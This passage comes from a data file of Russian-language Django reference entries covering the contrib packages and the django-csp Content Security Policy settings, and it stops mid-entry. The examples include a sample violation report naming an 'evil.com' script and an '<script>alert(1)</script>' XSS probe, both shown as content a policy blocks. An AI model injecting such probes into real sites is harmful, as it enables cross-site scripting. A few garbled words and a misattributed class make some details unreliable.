      "Расширения Django ORM для специфичных возможностей PostgreSQL: ArrayField, JSONField (исторический — с 3.1 есть в core db), HStoreField, RangeField (IntegerRangeField, DateRangeField и др.), полнотекстовый поиск (SearchVector, SearchQuery, SearchRank, TrigramSimilarity), агрегаты (ArrayAgg, BoolAnd, StringAgg), индексы (BrinIndex, GinIndex, GistIndex), ограничения (ExclusionConstraint). Работает только с PostgreSQL.",
    syntax: `# settings.py
INSTALLED_APPS = ['django.contrib.postgres', ...]`,
    arguments: [],
    example: `# settings.py
INSTALLED_APPS = ['django.contrib.postgres', ...]

# models.py — массивы и полнотекст
from django.db import models
from django.contrib.postgres.fields import ArrayField
from django.contrib.postgres.indexes import GinIndex
from django.contrib.postgres.search import SearchVectorField

class Article(models.Model):
    title = models.CharField(max_length=200)
    body = models.TextField()
    tags = ArrayField(models.CharField(max_length=50), default=list)
    search_vector = SearchVectorField(null=True)

    class Meta:
        indexes = [GinIndex(fields=['tags']), GinIndex(fields=['search_vector'])]

# Запросы по массиву
Article.objects.filter(tags__contains=['python'])           # содержит элемент
Article.objects.filter(tags__overlap=['python', 'django'])  # пересекается
Article.objects.filter(tags__len=3)                         # длина массива

# Полнотекстовый поиск
from django.contrib.postgres.search import (
    SearchVector, SearchQuery, SearchRank, TrigramSimilarity,
)

results = (
    Article.objects.annotate(
        rank=SearchRank(SearchVector('title', 'body'), SearchQuery('python'))
    )
    .filter(rank__gte=0.1)
    .order_by('-rank')
)

# Похожесть по триграммам (нужно расширение pg_trgm)
similar = (
    Article.objects.annotate(sim=TrigramSimilarity('title', 'pythn'))
    .filter(sim__gt=0.3)
    .order_by('-sim')
)

# Range-поля
from django.contrib.postgres.fields import IntegerRangeField, DateTimeRangeField

class Booking(models.Model):
    period = DateTimeRangeField()
    age_range = IntegerRangeField()`,
  },
  {
    name: "django.contrib.redirects",
    category: "contrib packages",
    description:
      "Подсистема для управления HTTP-редиректами через админку. Хранит соответствия old_path → new_path в модели Redirect (привязана к Site). Активируется через RedirectFallbackMiddleware: если запрос не нашёл совпадения в URLconf и вернул 404, middleware ищет редирект с подходящим old_path и отдаёт 301 (постоянный) на new_path. Если new_path пустой — возвращает 410 Gone. Требует contrib.sites.",
    syntax: `# settings.py
INSTALLED_APPS = ['django.contrib.redirects', 'django.contrib.sites', ...]
MIDDLEWARE = [..., 'django.contrib.redirects.middleware.RedirectFallbackMiddleware']
SITE_ID = 1`,
    arguments: [],
    example: `# settings.py
INSTALLED_APPS = [
    'django.contrib.sites',
    'django.contrib.redirects',
    ...,
]
SITE_ID = 1
MIDDLEWARE = [
    ...,
    'django.contrib.redirects.middleware.RedirectFallbackMiddleware',
]
# python manage.py migrate

# В админке: Redirects → Add redirect
#   Site:     example.com
#   Old path: /old-blog/article-1/
#   New path: /blog/2024/article-1/

# Логика middleware:
#   GET /old-blog/article-1/
#     1. URLconf не нашёл совпадения → ответ 404
#     2. RedirectFallbackMiddleware ловит 404
#     3. Ищет Redirect.objects.get(site=current, old_path='/old-blog/article-1/')
#     4. Если найдено и new_path != '' → 301 Moved Permanently на new_path
#     5. Если new_path == ''             → 410 Gone

# Программное создание редиректов
from django.contrib.redirects.models import Redirect
from django.contrib.sites.models import Site

site = Site.objects.get_current()
Redirect.objects.create(
    site=site,
    old_path='/legacy/page/',
    new_path='/new/page/',
)

# Удаление страницы — оставить 410 Gone:
Redirect.objects.create(site=site, old_path='/deleted/', new_path='')`,
  },
  {
    name: "django.contrib.sessions",
    category: "contrib packages",
    description:
      "Подсистема серверных сессий — хранение per-user данных между запросами через cookie с session ID. Поддерживает backend-хранилища: db (django_session), cache (Redis/Memcached), cached_db (комбинированное), file (на диске), signed_cookies (в подписанной cookie без серверного хранения). Подключается через SessionMiddleware, доступ — через request.session (словарь-подобный объект).",
    syntax: `# settings.py
INSTALLED_APPS = ['django.contrib.sessions', ...]
MIDDLEWARE = [..., 'django.contrib.sessions.middleware.SessionMiddleware']
SESSION_ENGINE = 'django.contrib.sessions.backends.db'`,
    arguments: [],
    example: `# settings.py
INSTALLED_APPS = ['django.contrib.sessions', ...]
MIDDLEWARE = [..., 'django.contrib.sessions.middleware.SessionMiddleware']

# Backend хранилища (выбор одного):
SESSION_ENGINE = 'django.contrib.sessions.backends.db'             # БД
# SESSION_ENGINE = 'django.contrib.sessions.backends.cache'         # Redis/Memcached
# SESSION_ENGINE = 'django.contrib.sessions.backends.cached_db'     # cache + db
# SESSION_ENGINE = 'django.contrib.sessions.backends.signed_cookies' # без сервера

SESSION_COOKIE_AGE = 60 * 60 * 24 * 14    # 14 дней
SESSION_EXPIRE_AT_BROWSER_CLOSE = False
SESSION_COOKIE_SECURE = True              # только HTTPS
SESSION_COOKIE_HTTPONLY = True

# Использование в view
def add_to_cart(request, product_id):
    cart = request.session.get('cart', [])
    cart.append(product_id)
    request.session['cart'] = cart
    request.session.modified = True   # явно при изменении вложенных структур
    return redirect('cart')

def view_cart(request):
    return render(request, 'cart.html', {'items': request.session.get('cart', [])})

def clear_cart(request):
    if 'cart' in request.session:
        del request.session['cart']
    return redirect('home')

# Установить срок жизни конкретной сессии
request.session.set_expiry(3600)   # 1 час
request.session.set_expiry(0)      # до закрытия браузера

# Очистка устаревших сессий
# python manage.py clearsessions`,
  },
  {
    name: "django.contrib.sites",
    category: "contrib packages",
    description:
      "Подсистема многосайтовости — позволяет одному Django-проекту обслуживать несколько доменов (multi-tenant) с разделением контента. Хранит модель Site с полями domain и name; текущий сайт определяется настройкой SITE_ID или middleware CurrentSiteMiddleware (по Host-заголовку). Используется как зависимость flatpages, redirects, sitemaps, syndication и для построения абсолютных URL независимо от текущего запроса.",
    syntax: `# settings.py
INSTALLED_APPS = ['django.contrib.sites', ...]
SITE_ID = 1`,
    arguments: [],
    example: `# settings.py
INSTALLED_APPS = ['django.contrib.sites', ...]
SITE_ID = 1
# python manage.py migrate
# По умолчанию создаётся Site(id=1, domain='example.com', name='example.com')

# Получить текущий сайт
from django.contrib.sites.models import Site

current = Site.objects.get_current()
print(current.domain)   # 'example.com'

# Переопределить домен (одноразово)
site = Site.objects.get(pk=1)
site.domain = 'mysite.ru'
site.name = 'Мой сайт'
site.save()

# Multi-tenant: разные сайты в одном проекте
# Site(id=1, domain='ru.example.com', name='RU')
# Site(id=2, domain='en.example.com', name='EN')

# В разных WSGI-инстансах указать свой SITE_ID
# Или использовать middleware для автоопределения по Host:
MIDDLEWARE = [
    ..., 'django.contrib.sites.middleware.CurrentSiteMiddleware',
]
# Тогда в любом view: request.site

# Привязка контента к сайту
from django.db import models
class Article(models.Model):
    title = models.CharField(max_length=200)
    sites = models.ManyToManyField(Site)

# Только статьи текущего сайта
articles = Article.objects.filter(sites=Site.objects.get_current())

# Построение абсолютных URL вне HTTP-запроса
from django.contrib.sites.shortcuts import get_current_site
def send_email(request):
    domain = get_current_site(request).domain
    url = f'https://{domain}/articles/{article.pk}/'`,
  },
  {
    name: "django.contrib.sitemaps",
    category: "contrib packages",
    description:
      "Генератор XML-sitemap по стандарту sitemaps.org — карты сайта для поисковых ботов (Google, Yandex, Bing). Sitemap описывается классом-наследником Sitemap с методами items(), location(), lastmod(), changefreq(), priority(). Sitemap index объединяет несколько sitemap. Подключается через django.contrib.sitemaps.views.sitemap. Опционально интегрируется с contrib.sites (домены) и pinging (ping_google).",
    syntax: `from django.contrib.sitemaps import Sitemap

class ArticleSitemap(Sitemap):
    def items(self):
        return Article.objects.filter(status='published')`,
    arguments: [],
    example: `# sitemaps.py
from django.contrib.sitemaps import Sitemap
from django.urls import reverse
from .models import Article

class ArticleSitemap(Sitemap):
    changefreq = 'weekly'
    priority = 0.8
    protocol = 'https'

    def items(self):
        return Article.objects.filter(status='published')

    def location(self, obj):
        return obj.get_absolute_url()   # или reverse('article', args=[obj.slug])

    def lastmod(self, obj):
        return obj.updated_at

class StaticSitemap(Sitemap):
    priority = 0.5
    changefreq = 'monthly'

    def items(self):
        return ['home', 'about', 'contact']  # имена URL

    def location(self, item):
        return reverse(item)

# urls.py
from django.contrib.sitemaps.views import sitemap
from .sitemaps import ArticleSitemap, StaticSitemap

sitemaps = {'articles': ArticleSitemap, 'static': StaticSitemap}

urlpatterns = [
    path(
        'sitemap.xml',
        sitemap,
        {'sitemaps': sitemaps},
        name='django.contrib.sitemaps.views.sitemap',
    ),
]

# Результат: GET /sitemap.xml
# <?xml version="1.0" encoding="UTF-8"?>
# <urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
#   <url>
#     <loc>https://example.com/articles/hello/</loc>
#     <lastmod>2024-03-15</lastmod>
#     <changefreq>weekly</changefreq>
#     <priority>0.8</priority>
#   </url>
#   ...
# </urlset>

# Большие sitemap → разбить на несколько через sitemap index:
from django.contrib.sitemaps.views import index
urlpatterns += [
    path('sitemap.xml', index, {'sitemaps': sitemaps}),
    path('sitemap-<section>.xml', sitemap, {'sitemaps': sitemaps},
         name='django.contrib.sitemaps.views.sitemap'),
]`,
  },
  {
    name: "django.contrib.staticfiles",
    category: "contrib packages",
    description:
      "Подсистема для сбора статических файлов (CSS, JS, изображения) из приложений и сторонних библиотек в одну директорию для отдачи веб-сервером. В development обслуживает файлы напрямую через django.contrib.staticfiles.views.serve. В production команда collectstatic собирает все файлы в STATIC_ROOT для отдачи nginx/CDN. Поддерживает finders (AppDirectories, FileSystem) и storages (FileSystemStorage, ManifestStaticFilesStorage с хешированием).",
    syntax: `# settings.py
INSTALLED_APPS = ['django.contrib.staticfiles', ...]
STATIC_URL = '/static/'
STATIC_ROOT = BASE_DIR / 'staticfiles'`,
    arguments: [],
    example: `# settings.py
INSTALLED_APPS = ['django.contrib.staticfiles', ...]

STATIC_URL = '/static/'                          # URL-префикс
STATIC_ROOT = BASE_DIR / 'staticfiles'           # куда соберёт collectstatic
STATICFILES_DIRS = [BASE_DIR / 'static']         # дополнительные директории

# Finders — где искать файлы
STATICFILES_FINDERS = [
    'django.contrib.staticfiles.finders.FileSystemFinder',     # STATICFILES_DIRS
    'django.contrib.staticfiles.finders.AppDirectoriesFinder', # <app>/static/<app>/
]

# Storage с хешированием для cache-busting (production)
STORAGES = {
    'staticfiles': {
        'BACKEND': 'django.contrib.staticfiles.storage.ManifestStaticFilesStorage',
    },
}
# Тогда style.css → style.5e2266cc1e2c.css (хеш в имени)

# В шаблоне
# {% load static %}
# <link rel="stylesheet" href="{% static 'css/style.css' %}">
# <img src="{% static 'img/logo.png' %}">
# С Manifest-storage в production: /static/css/style.5e2266cc1e2c.css

# Структура файлов:
#   blog/static/blog/style.css      ← найдётся как 'blog/style.css'
#   <project>/static/css/main.css   ← найдётся как 'css/main.css'

# Команды:
#   python manage.py collectstatic        # собрать в STATIC_ROOT
#   python manage.py findstatic css/main.css   # показать, где лежит файл

# urls.py для разработки (не нужно в production — отдаёт nginx)
from django.conf import settings
from django.conf.urls.static import static
urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)`,
  },
  {
    name: "django.contrib.syndication",
    category: "contrib packages",
    description:
      "Генератор RSS- и Atom-фидов на основе классов-наследников Feed (для одного фида) или GenericAPIView. Описывает источник методами items() (объекты), title()/link()/description() (атрибуты канала), item_title()/item_description()/item_link()/item_pubdate() (атрибуты записи). Под капотом использует django.utils.feedgenerator.Rss201rev2Feed (RSS 2.0) или Atom1Feed. Подключается как обычный view в URLconf.",
    syntax: `from django.contrib.syndication.views import Feed

class ArticlesFeed(Feed):
    title = 'Статьи блога'
    link = '/feed/'
    def items(self): return Article.objects.all()[:20]`,
    arguments: [],
    example: `# feeds.py
from django.contrib.syndication.views import Feed
from django.utils.feedgenerator import Atom1Feed
from django.urls import reverse
from .models import Article

class LatestArticlesFeed(Feed):
    title = 'Блог — последние статьи'
    link = '/blog/'
    description = 'Последние публикации блога'

    def items(self):
        return Article.objects.filter(status='published').order_by('-published_at')[:20]

    def item_title(self, item):
        return item.title

    def item_description(self, item):
        return item.summary

    def item_link(self, item):
        return reverse('article-detail', kwargs={'slug': item.slug})

    def item_pubdate(self, item):
        return item.published_at

    def item_author_name(self, item):
        return item.author.get_full_name()

# Atom-фид — наследник с другим feed_type
class LatestArticlesAtomFeed(LatestArticlesFeed):
    feed_type = Atom1Feed
    subtitle = LatestArticlesFeed.description

# Параметризованный фид (категория из URL)
class CategoryFeed(Feed):
    def get_object(self, request, slug):
        return Category.objects.get(slug=slug)

    def title(self, obj):  return f'Статьи в категории {obj.name}'
    def link(self, obj):   return obj.get_absolute_url()
    def items(self, obj):  return obj.articles.order_by('-published_at')[:20]

# urls.py
from django.urls import path
from .feeds import LatestArticlesFeed, LatestArticlesAtomFeed, CategoryFeed

urlpatterns = [
    path('feed/rss/',  LatestArticlesFeed(),     name='rss-feed'),
    path('feed/atom/', LatestArticlesAtomFeed(), name='atom-feed'),
    path('feed/category/<slug:slug>/', CategoryFeed(), name='category-feed'),
]

# В <head> сайта добавить ссылки на фиды:
# <link rel="alternate" type="application/rss+xml"
#       href="/feed/rss/" title="RSS">`,
  },
  {
    name: "CSP_CONFIG",
    category: "Content Security Policy",
    description:
      "Унифицированная настройка Content Security Policy в django-csp 4.0+. Словарь со всеми директивами CSP вместе: DIRECTIVES (правила вида default-src, script-src и пр.), REPORT_URI, REPORT_PERCENTAGE, EXCLUDE_URL_PREFIXES. Заменяет старые отдельные настройки CSP_DEFAULT_SRC/CSP_SCRIPT_SRC/... которые остаются как deprecated. Применяется через CSPMiddleware из django.middleware.csp (или csp.middleware.CSPMiddleware в более ранних версиях django-csp).",
    syntax: `# settings.py
CONTENT_SECURITY_POLICY = {
    'DIRECTIVES': {'default-src': ("'self'",), ...},
    'REPORT_URI': '/csp-report/',
}`,
    arguments: [],
    example: `# settings.py — django-csp 4.0+
INSTALLED_APPS = ['csp', ...]
MIDDLEWARE = [..., 'csp.middleware.CSPMiddleware']

CONTENT_SECURITY_POLICY = {
    'DIRECTIVES': {
        'default-src': ("'self'",),
        'script-src':  ("'self'", 'https://cdn.jsdelivr.net'),
        'style-src':   ("'self'", "'unsafe-inline'"),
        'img-src':     ("'self'", 'data:', 'https://images.example.com'),
        'font-src':    ("'self'", 'https://fonts.gstatic.com'),
        'connect-src': ("'self'", 'https://api.example.com'),
        'frame-ancestors': ("'none'",),
        'base-uri':       ("'self'",),
        'form-action':    ("'self'",),
        'report-uri':     ('/csp-report/',),
    },
    'REPORT_PERCENTAGE': 10,                      # отчёты только с 10% запросов
    'EXCLUDE_URL_PREFIXES': ('/admin/', '/api/'), # не применять к этим URL
}

# Только-отчётный режим (не блокирует, но шлёт отчёты)
CONTENT_SECURITY_POLICY_REPORT_ONLY = {
    'DIRECTIVES': {
        'default-src': ("'self'",),
        'report-uri': ('/csp-report/',),
    },
}

# Заголовок Content-Security-Policy будет:
# default-src 'self'; script-src 'self' https://cdn.jsdelivr.net; ...

# Точечное переопределение для view
from csp.decorators import csp_update, csp_replace, csp_exempt

@csp_update(DIRECTIVES={'script-src': ['https://maps.googleapis.com']})
def map_view(request): ...

@csp_exempt
def embed_view(request): ...   # без CSP-заголовка`,
  },
  {
    name: "CSP_REPORT_URI",
    category: "Content Security Policy",
    description:
      'Настройка django-csp (legacy в 4.0+, актуальна в <4.0): URL, на который браузер отправляет JSON-отчёты о нарушениях CSP. При попытке загрузить ресурс, не разрешённый политикой, браузер делает POST с описанием нарушения (csp-report). URL должен принимать POST application/csp-report. В версии 4.0+ задаётся через CONTENT_SECURITY_POLICY["REPORT_URI"] (или [\'DIRECTIVES\']["report-uri"]).',
    syntax: `# settings.py (django-csp <4.0)
CSP_REPORT_URI = '/csp-report/'
# или несколько URL — кортеж`,
    arguments: [],
    example: `# settings.py
CSP_REPORT_URI = '/csp-report/'
# или внешний сервис (например, Sentry или report-uri.com):
CSP_REPORT_URI = 'https://example.report-uri.com/r/d/csp/enforce'

# views.py — собственный приёмник отчётов
import json
from django.views.decorators.csrf import csrf_exempt
from django.views.decorators.http import require_POST
from django.http import HttpResponse

@csrf_exempt
@require_POST
def csp_report(request):
    try:
        report = json.loads(request.body)['csp-report']
    except (ValueError, KeyError):
        return HttpResponse(status=400)

    # Логируем нарушение
    logger.warning(
        'CSP violation: %s blocked %s on %s',
        report.get('violated-directive'),
        report.get('blocked-uri'),
        report.get('document-uri'),
    )
    return HttpResponse(status=204)

# urls.py
# path('csp-report/', csp_report, name='csp-report')

# Пример отчёта от браузера:
# {
#   "csp-report": {
#     "document-uri":       "https://example.com/page",
#     "violated-directive": "script-src",
#     "blocked-uri":        "https://evil.com/x.js",
#     "original-policy":    "default-src 'self'; script-src 'self'"
#   }
# }

# В django-csp 4.0+:
CONTENT_SECURITY_POLICY = {
    'DIRECTIVES': {
        'default-src': ("'self'",),
        'report-uri':  ('/csp-report/',),
    },
    'REPORT_PERCENTAGE': 10,   # сэмплирование, чтобы не утопить логи
}`,
  },
  {
    name: "CSP_REPORT_ONLY",
    category: "Content Security Policy",
    description:
      "Логическая настройка django-csp (legacy): True — отправлять заголовок Content-Security-Policy-Report-Only вместо Content-Security-Policy. В этом режиме браузер НЕ блокирует нарушения, а только отчитывается на report-uri. Используется для безопасного тестирования новой политики на production-трафике перед её включением в boquant-режиме. В django-csp 4.0+ заменяется отдельной настройкой CONTENT_SECURITY_POLICY_REPORT_ONLY.",
    syntax: `# settings.py (django-csp <4.0)
CSP_REPORT_ONLY = True`,
    arguments: [],
    example: `# settings.py — этап тестирования новой политики
CSP_DEFAULT_SRC = ("'self'",)
CSP_SCRIPT_SRC  = ("'self'", 'https://cdn.example.com')
CSP_REPORT_URI  = '/csp-report/'
CSP_REPORT_ONLY = True   # только отчёты, не блокировать

# Заголовок ответа будет:
# Content-Security-Policy-Report-Only: default-src 'self'; script-src 'self' https://cdn.example.com; report-uri /csp-report/

# Workflow внедрения CSP:
#   1. CSP_REPORT_ONLY = True + сбор отчётов → 1-2 недели
#   2. Анализ csp-report логов: какие легитимные ресурсы блокируются
#   3. Дополнить CSP_*_SRC недостающими источниками
#   4. CSP_REPORT_ONLY = False — включить блокировку

# В django-csp 4.0+: две независимые настройки одновременно работают
CONTENT_SECURITY_POLICY = {
    'DIRECTIVES': {'default-src': ("'self'",)},  # блокирует
}
CONTENT_SECURITY_POLICY_REPORT_ONLY = {
    'DIRECTIVES': {                              # тестирует более строгую
        'default-src': ("'self'",),
        'script-src':  ("'self'",),              # без cdn — увидим, что сломается
        'report-uri':  ('/csp-report/',),
    },
}`,
  },
  {
    name: "CSP_DEFAULT_SRC",
    category: "Content Security Policy",
    description:
      'Настройка django-csp (legacy): директива default-src — fallback для всех директив *-src, которые не заданы явно (script-src, style-src, img-src, font-src, connect-src, media-src, object-src, frame-src и др.). Кортеж разрешённых источников. Типичные значения: "\'self\'" (свой домен), "\'none\'" (запретить всё), URL "https://cdn.example.com", схемы "data:", "blob:", "https:", ключевые слова "\'unsafe-inline\'", "\'unsafe-eval\'". В 4.0+ — DIRECTIVES["default-src"].',
    syntax: `# settings.py (django-csp <4.0)
CSP_DEFAULT_SRC = ("'self'",)`,
    arguments: [],
    example: `# settings.py
# Базовая безопасная политика — всё со своего домена
CSP_DEFAULT_SRC = ("'self'",)
# Заголовок: Content-Security-Policy: default-src 'self'

# Полный запрет всего по умолчанию (нужно явно разрешать каждую категорию)
CSP_DEFAULT_SRC = ("'none'",)
CSP_SCRIPT_SRC  = ("'self'",)   # без этого скрипты не загрузятся
CSP_STYLE_SRC   = ("'self'",)
CSP_IMG_SRC     = ("'self'", 'data:')

# Разрешить ресурсы с поддоменов и CDN
CSP_DEFAULT_SRC = (
    "'self'",
    'https://*.example.com',           # любой поддомен
    'https://cdn.jsdelivr.net',
)

# Разные схемы:
CSP_DEFAULT_SRC = (
    "'self'",
    'data:',         # data:image/png;base64,...
    'blob:',         # URL.createObjectURL()
    'https:',        # любой HTTPS-источник (мягко)
)

# default-src НЕ покрывает:
#   - frame-ancestors  (нужно задавать явно)
#   - form-action      (нужно задавать явно)
#   - base-uri         (нужно задавать явно)
#   - report-uri       (нужно задавать явно)`,
  },
  {
    name: "CSP_SCRIPT_SRC",
    category: "Content Security Policy",
    description:
      'Настройка django-csp: директива script-src — какие источники могут выполнять JavaScript. Контролирует <script src=...>, inline-скрипты <script>...</script>, eval(), setTimeout("...") и обработчики событий. По умолчанию (если не задана) используется default-src. Особые ключевые слова: "\'unsafe-inline\'" (разрешить инлайн), "\'unsafe-eval\'" (разрешить eval), "\'nonce-XXX\'" (одноразовый токен), "\'sha256-XXX\'" (хеш конкретного блока). В 4.0+ — DIRECTIVES["script-src"].',
    syntax: `# settings.py (django-csp <4.0)
CSP_SCRIPT_SRC = ("'self'", 'https://cdn.jsdelivr.net')`,
    arguments: [],
    example: `# Базовая политика для скриптов
CSP_SCRIPT_SRC = (
    "'self'",                              # /static/js/*.js
    'https://cdn.jsdelivr.net',            # библиотеки с CDN
    'https://www.google-analytics.com',
)

# Запретить inline-скрипты (рекомендуется)
# CSP_SCRIPT_SRC БЕЗ 'unsafe-inline' → <script>alert(1)</script> заблокируется

# Если без inline никак — использовать nonce (одноразовый токен)
CSP_INCLUDE_NONCE_IN = ('script-src',)
CSP_SCRIPT_SRC = ("'self'",)
# В шаблоне:
# <script nonce="{{ request.csp_nonce }}">
#   doSomething();
# </script>
# Браузер выполнит скрипт только если nonce совпал с заголовком CSP.

# Альтернатива nonce — хеш конкретного блока (статичный)
CSP_SCRIPT_SRC = (
    "'self'",
    "'sha256-B2yPHKaXnvFWtRChIbabYmUBFZdVfKKXHbWtWidDVF8='",
)
# Разрешит только тот <script>, чей SHA-256 совпал.

# Strict-dynamic: nonce-помеченные скрипты могут динамически загружать другие
CSP_SCRIPT_SRC = ("'strict-dynamic'", "'nonce-XXX'")

# Опасные настройки — избегать в production:
# CSP_SCRIPT_SRC = ("'self'", "'unsafe-inline'", "'unsafe-eval'")  # XSS-риск`,
  },
  {
    name: "CSP_STYLE_SRC",
    category: "Content Security Policy",
    description:
      'Настройка django-csp: директива style-src — какие источники могут предоставлять CSS. Контролирует <link rel="stylesheet">, inline-стили <style>...</style> и атрибут style="..." на тегах. По умолчанию использует default-src. Часто требуется "\'unsafe-inline\'", потому что многие фронтенд-библиотеки и компонентные системы вставляют style-атрибуты программно. Альтернатива — nonce/hash, как для script-src.',
    syntax: `# settings.py (django-csp <4.0)
CSP_STYLE_SRC = ("'self'", "'unsafe-inline'")`,
    arguments: [],
    example: `# Типичная политика для стилей
CSP_STYLE_SRC = (
    "'self'",
    "'unsafe-inline'",                  # часто неизбежно для современных JS-фреймворков
    'https://fonts.googleapis.com',     # Google Fonts CSS
    'https://cdn.jsdelivr.net',
)

# Строгая политика без inline (требует переписать style="..." в классы)
CSP_STYLE_SRC = ("'self'",)
# Тогда:
# <div style="color: red">  ← заблокируется
# <div class="text-red">    ← OK

# Inline-стили через nonce (одноразовый)
CSP_INCLUDE_NONCE_IN = ('script-src', 'style-src')
CSP_STYLE_SRC = ("'self'",)
# В шаблоне:
# <style nonce="{{ request.csp_nonce }}">
#   .my-class { color: red; }
# </style>

# Inline-стили через хеш
CSP_STYLE_SRC = (
    "'self'",
    "'sha256-Vt1ICX/dT0KN/AKDvHE7T3ohtqAbXlAtdBrL3IdLylU='",
)

# Атрибут style="" контролируется отдельной директивой style-src-attr
# (django-csp 4.0+):
CONTENT_SECURITY_POLICY = {
    'DIRECTIVES': {
        'style-src':      ("'self'",),                 # <link>, <style>
        'style-src-attr': ("'unsafe-inline'",),        # style="..." атрибуты
        'style-src-elem': ("'self'",),                 # только <style> и <link>
    },
}`,
  },
  {
    name: "CSP_IMG_SRC",
    category: "Content Security Policy",
    description:
      'Настройка django-csp: директива img-src — какие источники разрешены для изображений. Контролирует <img src=...>, <picture> <source>, фавиконку, CSS background-image, list-style-image и cursor: url(). По умолчанию использует default-src. Часто включает "data:" (для inline base64-картинок) и "blob:" (для URL.createObjectURL). Можно разрешить любой HTTPS-источник через "https:".',
    syntax: `# settings.py (django-csp <4.0)
CSP_IMG_SRC = ("'self'", 'data:', 'https://images.example.com')`,
    arguments: [],
    example: `# Базовая политика для изображений
CSP_IMG_SRC = (
    "'self'",                                # /static/img/*, /media/*
    'data:',                                 # data:image/png;base64,...
    'https://images.example.com',            # CDN изображений
    'https://www.gravatar.com',              # аватарки
)

# РазрешитЌ любой HTTPS-источник (для UGC, где пользователи вставляют ссылки)
CSP_IMG_SRC = ("'self'", 'data:', 'blob:', 'https:')

# Только свой домен и data: (строго)
CSP_IMG_SRC = ("'self'", 'data:')

# Что покрывается:
# <img src="https://allowed.com/x.png">                    — проверяется
# <picture><source srcset="https://allowed.com/x.webp"></picture> — проверяется
# style: background-image: url(https://allowed.com/x.png) — проверяется
# style: list-style-image: url(...)                        — проверяется
# <link rel="icon" href="/favicon.ico">                    — проверяется

# Отдельная директива favicon-источников отсутствует — favicon под img-src.

# Подмножества для конкретных URL — через @csp_update
from csp.decorators import csp_update

@csp_update(IMG_SRC=['https://maps.googleapis.com'])  # legacy
def map_view(request): ...
# Эта view получит расширенный img-src только для своего ответа.`,
  },
  {
    name: "CSP_FONT_SRC",
    category: "Content Security Policy",
    description:
      'Настройка django-csp: директива font-src — какие источники разрешены для шрифтов, загружаемых через @font-face { src: url(...) }. По умолчанию использует default-src. Типичные значения: "\'self\'" (собственные .woff/.woff2), "https://fonts.gstatic.com" (Google Fonts), "data:" (inline-шрифты в base64). Не контролирует системные шрифты (font-family: Arial) — только сетевые URL.',
    syntax: `# settings.py (django-csp <4.0)
CSP_FONT_SRC = ("'self'", 'https://fonts.gstatic.com')`,
    arguments: [],
    example: `# Типичная политика — Google Fonts
CSP_FONT_SRC = (
    "'self'",
    'https://fonts.gstatic.com',          # сами .woff2 файлы
)
# При этом для CSS Google Fonts нужен также:
CSP_STYLE_SRC = (
    "'self'",
    'https://fonts.googleapis.com',       # CSS-файл с @font-face
)

# Только свои шрифты (рекомендуется для приватности)
CSP_FONT_SRC = ("'self'",)

# Inline base64-шрифты (data: URL в @font-face src)
CSP_FONT_SRC = ("'self'", 'data:')

# Полный CDN-набор
CSP_FONT_SRC = (
    "'self'",
    'https://fonts.gstatic.com',
    'https://use.typekit.net',            # Adobe Fonts
    'https://fonts.bunny.net',            # Bunny Fonts (privacy-friendly)
)

# Что покрывается:
# @font-face {
#   font-family: 'MyFont';
#   src: url('/static/fonts/myfont.woff2') format('woff2');  ← 'self'
# }
# @import url('https://fonts.googleapis.com/css?family=Roboto');  ← style-src
# (но загрузка .woff2 с fonts.gstatic.com → font-src)`,
  },
  {
    name: "CSP_CONNECT_SRC",
    category: "Content Security Policy",
    description:
      "Настройка django-csp: директива connect-src — какие источники разрешены для сетевых запросов из JavaScript. Контролирует fetch(), XMLHttpRequest, WebSocket (ws:/wss:), EventSource (SSE), navigator.sendBeacon() и Server-Sent Events. По умолчанию использует default-src. Критична для SPA: если фронтенд обращается к API на отдельном домене, его нужно явно разрешить.",
    syntax: `# settings.py (django-csp <4.0)
CSP_CONNECT_SRC = ("'self'", 'https://api.example.com', 'wss://ws.example.com')`,
    arguments: [],
    example: `# SPA с отдельным API-доменом и WebSocket
CSP_CONNECT_SRC = (
    "'self'",                               # fetch к относительным URL
    'https://api.example.com',              # REST API
    'wss://realtime.example.com',           # WebSocket
    'https://www.google-analytics.com',     # отправка событий
    'https://sentry.io',                    # отправка ошибок Sentry
)

# Что покрывается:
# fetch('/api/users/')                          ← 'self'
# fetch('https://api.example.com/v1/me')        ← https://api.example.com
# new WebSocket('wss://realtime.example.com')   ← wss://realtime...
# new EventSource('/sse/notifications/')        ← 'self'
# navigator.sendBeacon('/analytics/', payload)  ← 'self'
# const xhr = new XMLHttpRequest(); xhr.open('GET', '/api/...');  ← 'self'

# Если разрешить только 'self' — все запросы наружу заблокируются:
CSP_CONNECT_SRC = ("'self'",)
# fetch('https://api.example.com/...') → CSP-нарушение, запрос заблокирован

# Для разработки удобно разрешить websocket dev-сервера (Vite/HMR):
if DEBUG:
    CSP_CONNECT_SRC = (*CSP_CONNECT_SRC, 'ws://localhost:5173')`,
  },
  {
    name: "CSP_MEDIA_SRC",
    category: "Content Security Policy",
    description:
      'Настройка django-csp: директива media-src — какие источники разрешены для аудио и видео (теги <audio>, <video>, <track>). По умолчанию использует default-src. Типичные значения: "\'self\'" для своих файлов, URL CDN (например, video CDN), "data:" и "blob:" (для записи в браузере). Не покрывает встроенные плееры YouTube/Vimeo — те загружаются через iframe и контролируются frame-src.',
    syntax: `# settings.py (django-csp <4.0)
CSP_MEDIA_SRC = ("'self'", 'https://media.example.com')`,
    arguments: [],
    example: `# Базовая политика для медиафайлов
CSP_MEDIA_SRC = (
    "'self'",
    'https://media.example.com',            # CDN с видео/аудио
    'https://stream.mux.com',               # видео-стриминговый сервис
)

# С blob: для записи в браузере (MediaRecorder)
CSP_MEDIA_SRC = ("'self'", 'blob:', 'mediastream:')
# Разрешает: <video src="blob:https://example.com/uuid">
# (создаётся через URL.createObjectURL(mediaStream))

# Что покрывается:
# <video src="/videos/intro.mp4">                       ← 'self'
# <video src="https://media.example.com/promo.mp4">     ← media.example.com
# <audio src="/audio/podcast.mp3">                      ← 'self'
# <video><track src="/captions/en.vtt"></video>         ← 'self' (для track)
# const url = URL.createObjectURL(blob); video.src = url;  ← blob:

# YouTube/Vimeo НЕ контролируются media-src:
# <iframe src="https://www.youtube.com/embed/XXX"></iframe>  ← это frame-src
# Поэтому для встраивания плееров нужно:
CSP_FRAME_SRC = ("'self'", 'https://www.youtube.com', 'https://player.vimeo.com')`,
  },
  {
    name: "CSP_OBJECT_SRC",
    category: "Content Security Policy",
    description:
